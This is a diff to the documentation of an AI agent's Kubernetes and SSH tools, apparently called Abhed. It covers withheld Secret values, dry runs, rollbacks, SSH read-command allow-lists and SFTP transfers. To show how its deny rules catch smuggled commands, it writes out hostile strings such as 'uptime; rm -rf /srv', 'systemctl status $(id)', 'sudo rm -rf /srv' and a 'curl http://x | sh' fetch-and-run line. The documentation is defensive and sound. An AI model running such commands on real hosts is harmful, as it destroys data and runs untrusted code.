@@ -29,14 +29,87 @@ Two tools, deliberately not one:
 
 | Tool | Approval | What it does |
 |---|---|---|
-| `k8s_get` | never prompts | list, describe, pod logs |
-| `k8s_apply` | **always prompts** | apply, delete, scale, restart |
+| `k8s_get` | never prompts | list, describe, pod logs, wait for a rollout |
+| `k8s_apply` | **always prompts** | apply, delete, scale, restart, rollback |
 
 Splitting them is what makes the safety real. Abhed's permission engine decides
 by tool name; a single tool with a `verb` argument would force it to parse an
 opaque string to tell `list pods` from `delete namespace`. As separate tools the
 read path is genuinely non-mutating, and every write goes through approval by
 construction rather than by correctly interpreting text.
+
+**A Secret's values never reach the model.** `k8s_get` of `secrets`, a
+single one or a list, and what the cluster answers a `k8s_apply` of a
+Secret, show each key of `data` and `stringData` with the value's length
+and sha256 in its place (`"tls.key": "[withheld: 1704 bytes, sha256 …]"`),
+for `data` of the decoded value. The `kubectl.kubernetes.io/last-applied-configuration`
+annotation, which holds the whole object, is withheld too, and a response to
+a `secrets` read that is not JSON is not shown at all. The same text is what
+the record and every screen get. The hash lets you check a value you hold
+against the cluster's; a short password can be guessed from it offline, so
+keep `k8s_get(*/*/secrets)` denied where that matters.
+
+**Every write is dry-run first.** Before anyone is asked, `k8s_apply` sends
+the request it will make as a server-side dry run (`dryRun=All`), so the
+cluster's admission, validation and RBAC judge it, and reads the object as
+it stands. The approval then names what would change, field by field, after
+the cluster and the credential: `dry run: 2 field(s) change: spec.replicas:
+2 → 3; spec.template.spec.containers[0].image: "nginx:1.25" → "nginx:1.27"`,
+or `dry run: creates Deployment demo/web`. Status and metadata noise are
+left out, a Secret's values are shown only as length and sha256, and past
+20 fields the rest are counted. The same text is in `action.requested`.
+The request that was dry-run is the one sent once approved, byte for byte;
+a restart's timestamp included. A change the dry run refuses is refused
+before anyone is asked, with the cluster's reason, and nothing is applied:
+the model reads `the cluster's dry run of this change failed, so it was not
+applied: …`. A call a rule denies reaches no cluster, not even for a dry run.
+
+**Secrets without the model.** A Secret written as a manifest carries its
+values in the call, where the model wrote them and the record keeps them.
+`secret_from` builds the Secret instead, from values Abhed reads itself:
+
+```json
+{"action": "apply", "namespace": "web",
+ "secret_from": {"name": "site-tls", "type": "kubernetes.io/tls",
+   "data": {"tls.crt": {"file": "/work/certs/site.crt"},
+            "tls.key": {"secret": "SITE_TLS_KEY"}}}}
+```
+
+Each key comes from a stored secret, by NAME (`abhed secret set
+SITE_TLS_KEY`), or from a workspace file, by absolute path; `type` is
+`Opaque` (the default) or `kubernetes.io/tls`, which needs `tls.crt` and
+`tls.key` and checks that each is a PEM certificate or private key. Each
+stored secret needs its own `allow secret(NAME)` rule, as every secret use
+does, and each file is judged as a `read` of it would be, so
+`deny read(*.key)` holds here too. The rules read the call as an `apply` of
+a Secret in its namespace, and the manifest they, the approver and the
+record see is the Secret without its values. The approval names each
+source with its value's length and sha256:
+`builds Secret site-tls (kubernetes.io/tls) with tls.crt from file
+/work/certs/site.crt [withheld: 1310 bytes, sha256 …], tls.key from stored
+secret SITE_TLS_KEY [withheld: …]`. The dry run before it sends
+placeholders, so no value leaves Abhed before a person says yes, and the
+diff compares the live Secret's values with the ones read by hash. A
+source that cannot be read, a certificate that is not one, values over
+1 MiB in all, or a call with both a `manifest` and `secret_from` is refused
+before anyone is asked, naming the source and never its content.
+
+**Rollouts.** `k8s_apply` with `action: "rollback"`, `resource:
+"deployments"` and a `name` does what `kubectl rollout undo` does: it puts
+the pod template of the Deployment's previous revision back (or of
+`revision` when the call names one), read from the ReplicaSets the
+Deployment owns. It asks like any write, its dry run shows the template
+fields that change, and the patch first tests the Deployment's
+`resourceVersion`, so a Deployment changed since the approval is refused,
+not rolled back to a revision no one saw. A paused Deployment is refused.
+Rules read it as `cluster/namespace/rollback`: a rule on `restart` or
+`apply` does not cover it, and `k8s_apply(prod/*)` does.
+
+`k8s_get` with `resource: "deployments"`, a `name` and `wait_seconds`
+(at most 600) waits for that Deployment's rollout, reading it every two
+seconds, and says whether it finished, failed on its progress deadline, or
+was still going when the wait ended, with the replica counts, as
+`kubectl rollout status` does. It is a read and never prompts.
 
 `allow_writes` decides whether `k8s_apply` exists at all. Even with it on, there
 is no permission mode that auto-approves a cluster write: a mistaken delete in
@@ -227,9 +300,13 @@ a cluster only by naming a context you already have, so the worst it can reach
 is what your own `kubectl` can. Token, tokenFile, client certificates and `exec`
 credential helpers (the cloud CLIs) all work; exec tokens are refreshed before
 they expire, because an expired token returns a 401 that reads like a
-permissions problem. An `exec` helper runs only when Abhed sends a request:
-never while a `k8s_apply` waits for approval, and never for a call that is
-denied or refused in plan mode.
+permissions problem. An `exec` helper runs only when Abhed sends a request for a call that
+may run: never while a `k8s_apply` waits for approval, and never for a call
+that is denied or refused in plan mode. So a write to a kubeconfig context
+whose helper has not run yet is asked about without a dry run, and the
+approval says `no dry run: the kubeconfig's credential helper has not run
+yet`; once a call has run it, later writes are dry-run with its token
+until the token is close to expiring.
 
 Abhed talks to the API directly rather than importing `client-go`, which would
 add roughly a hundred transitive dependencies to a bundle where each one is
@@ -311,12 +388,43 @@ retry with `accept_host_key: true` **only if the user has said the host is new
 or ephemeral**. That is a deliberate line: the agent should not decide on its
 own to stop verifying the identity of a machine it is about to run commands on.
 
-**Every remote command requires approval — there is no read-only classification.**
+**Every remote command requires approval unless the operator declared it a read.**
 A local `bash` call can be judged by its text because it runs inside a sandbox
 with a workspace boundary and a checkpoint behind it. None of that holds over
 SSH: the command runs with the remote account's full authority, outside any
 scoping, with no undo. Calling `cat` safe there would be judging the string
-rather than the consequence.
+rather than the consequence, so Abhed does not do it on its own.
+
+The operator can, for the commands they know are reads on their machines,
+with `ssh.read_commands`: a list of exact commands, or patterns for one
+simple command, matched on every host.
+
+```json
+"ssh": { "enabled": true, "read_commands": [
+  "uptime", "df -h", "systemctl status *",
+  "openssl x509 -enddate -noout -in /etc/nginx/tls/site.crt"
+] }
+```
+
+A call whose command is one simple command matching an entry is a read: plan
+mode allows it, so a plan can start by inspecting the fleet, and no mode asks
+for it. Everything else is as before. The command must be one simple command,
+read as bash reads it: `uptime; rm -rf /srv`, `uptime | sh`,
+`systemctl status $(id)`, a redirection, a line the parser cannot read in
+full and one the destructive step names are not reads, and plan mode refuses
+them. Deny and ask rules come first, and a managed `bypass` refusal still
+asks. `*` matches any text, so `systemctl status *` also matches
+`systemctl status nginx --now`; prefer exact commands and patterns whose
+program cannot write. An entry is refused at load when it is not one simple
+command, when it does not start with the program written out (`* --version`),
+when a wildcard follows a runner or a shell (`sudo *`, `bash -c *`), or when
+the destructive step names it. The `ssh` tool's description lists the
+entries, so the model knows which commands it may run in plan mode.
+
+Only a trusted configuration file sets `ssh.read_commands`; a workspace
+cannot. A managed file that sets it replaces the list (`[]` allows none), and
+one that sets any `permissions` key without it sets the person's entries
+aside, as it does their allow rules.
 
 A [runbook](../guide/28-runbooks.md) is the one way to approve remote commands
 ahead of time: the person reads each exact command once, with the plan, and
@@ -332,13 +440,71 @@ Permission rules and "always allow" read an `ssh` call as `host/command`,
 so a rule or an answer for one host never covers another:
 `ssh(build1/*)` allows every command on `build1` and nothing elsewhere, and
 "don't ask again" for `uptime` on `build1` offers `ssh(build1/uptime)`.
-Deny and ask rules also read the command alone, so `ssh(rm *)` still stops
-`rm` on every host.
+The command is read as a `bash` command is, since the remote shell runs it.
+Deny and ask rules see each command in a chain, pipe or substitution and
+behind a runner such as `sudo`, `env` or `nice`, alone and as `host/command`,
+so `ssh(rm *)` stops `rm -rf /srv`, `true; rm -rf /srv` and
+`sudo rm -rf /srv` on every host. An allow rule with a pattern approves only
+one simple command: `ssh(web1/openssl x509 *)` approves
+`openssl x509 -enddate -noout -in site.crt` and not
+`openssl x509 -in a.pem; rm -rf /var/www` or `... && curl http://x | sh`,
+which ask. While a deny rule for `ssh` has a pattern, a line the parser
+cannot read in full (an open quote, a trailing `|`, `eval "$x"`) is
+refused. A command the destructive step names (`rm -rf`, `dd of=`, a force
+push) always confirms twice and offers no "always", in every mode. The rules
+cannot see inside a script the command runs on the host (`./deploy.sh`), and
+the command is read as bash reads it, whatever the remote login shell is.
 
 ```json
 "deny":  ["ssh(db1/*)", "ssh(rm *)"],
 "allow": ["ssh(build1/uptime)"]
 ```
+
+**A secret on the remote command's stdin.** A command that needs a
+password or a key (`sudo -S`, `chpasswd`, `cat > /etc/app/key`) takes it
+from the secrets store: store it with `abhed secret set DB_PW`, allow
+`secret(DB_PW)`, and the agent passes `"stdin_secret": "DB_PW"` beside the
+command. The value is written to the command's stdin, with a final newline
+if it has none, and is never in the command line, the approval, the record
+or the model's view: the approval names it (`writes stored secret DB_PW to
+the command's stdin`), and anything the command prints of it comes back as
+`[secret DB_PW]`. The rules read the call as they read any `ssh` call, by
+`host/command`, and the secret needs its own rule in every mode.
+
+### Moving files to and from a host
+
+With `"transfers": true`, `ssh_put` and `ssh_get` move one file at a time
+over SFTP, as the host's own `sftp-server` serves it. They are off by
+default, so turning on `ssh` alone gives no new way to change a host.
+
+```json
+"ssh": { "enabled": true, "transfers": true, "transfer_max_mb": 16 }
+```
+
+- `ssh_put` writes `remote_path` (absolute and clean) on a host from a
+  workspace `file` or a stored `secret` by NAME, with `mode` (octal; 0644
+  for a file, 0600 for a secret, by default). What is sent never passes
+  through the model: a TLS key goes from the secrets store to the host.
+  Where the server can rename over a file (OpenSSH's `posix-rename`), the
+  content is written beside the target and renamed over it, so a failed
+  transfer leaves the old file; elsewhere it is written in place.
+- `ssh_get` reads `remote_path` into a workspace `file`. A new file is
+  readable by its owner only; an existing one is replaced only if the
+  session has read it, and the change can be undone like a write.
+
+Both always ask unless an allow rule covers them, and read as
+`host:remote_path`, so `ssh_get(web1:/etc/nginx/*)` allows fetching the
+nginx configuration from `web1` and nothing else. Rules on `ssh` do not
+cover them. A secret needs its own `secret(NAME)` rule; the workspace file
+is judged as a `read` (for `ssh_put`) or `write` (for `ssh_get`) of it would
+be, so `deny read(*.key)` and `ask write(*.conf)` hold here too. The
+approval names the account, address, path, source and mode, and the result
+gives the size and sha256 of what moved; neither, nor the record, holds
+the content. A file over `transfer_max_mb` (16 MiB by default, at most
+1024) is refused before it is read or sent, and a call that cannot succeed
+(an unknown host, a relative or unclean path, a source that cannot be read)
+is refused before anyone is asked. A workspace configuration can only turn
+transfers off or lower the bound.
 
 Credentials, in order of preference: the **SSH agent** (the key never leaves
 it), then `identity_file`, then `password_env` — which names an environment
